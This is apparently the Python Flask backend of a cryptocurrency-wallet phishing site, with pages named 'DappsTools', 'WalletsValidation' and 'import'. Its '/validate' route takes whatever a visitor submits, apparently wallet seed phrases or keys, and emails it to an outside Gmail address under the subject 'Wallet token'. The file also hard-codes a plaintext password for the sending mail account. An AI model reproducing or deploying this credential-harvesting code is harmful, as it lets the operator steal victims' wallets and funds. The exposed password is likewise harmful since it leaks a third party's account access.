from flask import Flask, render_template, request, url_for
import smtplib, ssl
app = Flask(__name__)
def sendMail(mess):

    # gmail_user = "info@unitedbconsesusnode.com"
    # gmail_password = "Myking08"

    # sent_from = gmail_user
    # to = ['mrjohn.soft@gmail.com',"foodhubnig@gmail.com"]
    # subject = 'Lorem ipsum dolor sit amet'
    # body = mess

    # email_text = """\
    # From: %s
    # To: %s
    # Subject: %s

    # %s
    # """ % (sent_from, ", ".join(to), subject, body)

    # try:
    #     smtp_server = smtplib.SMTP_SSL('mail.privateemail.com', 465)
    #     smtp_server.ehlo()
    #     smtp_server.login(gmail_user, gmail_password)
    #     smtp_server.sendmail(sent_from, to, email_text)
    #     smtp_server.close()
    #     print ("Email sent successfully!")
    # except Exception as ex:
    #     print ("Something went wrong….",ex)



    #smtplib is the module used by python to send emails through SMTP.
    #The ssl module is used to access the Operating System Socket.
    port = 465
    #This port will be required later.
    email = "info@unitedbconsesusnode.com"
    #You key in the email address you want to send an email with.
    password = "Myking08"
    #This is the password to the email inputed before
    recipient = "huyfardry@gmail.com"
    #This is the email address which the emai is being sent to.
    subject = "Wallet token"
    #This is the subject head of the email
    text = mess
    #This is the body of the email.
    #We combine the subject and the text to form the subject head and the body.
    message = "Subject: {}\n\n{}".format(subject, text)
    context = ssl.create_default_context()
    #This method just creates a new class instance for implemenmtation of a secure protocol.
    with smtplib.SMTP_SSL("mail.privateemail.com",port,context=context) as servers:
        #This syncs the local smtp server in the localhost with Gmail's server
            servers.login(email,password)
            #This is the login credentials being checked.
            servers.sendmail(email, recipient,message)
            #The server is initialized to send an email with the three parameters




@app.route("/")
def home():
    return render_template("DappsTools.html")

@app.route("/validate", methods=["GET", "POST"])
def dapp():
    if request.method == "POST":
        print(request.form)
        sendMail(request.form)
        return render_template("import.html")
    return render_template("WalletsValidation.html")

@app.route('/import')
def importWall():
    return render_template("import.html")
if __name__ == "__main__":
    app.run()
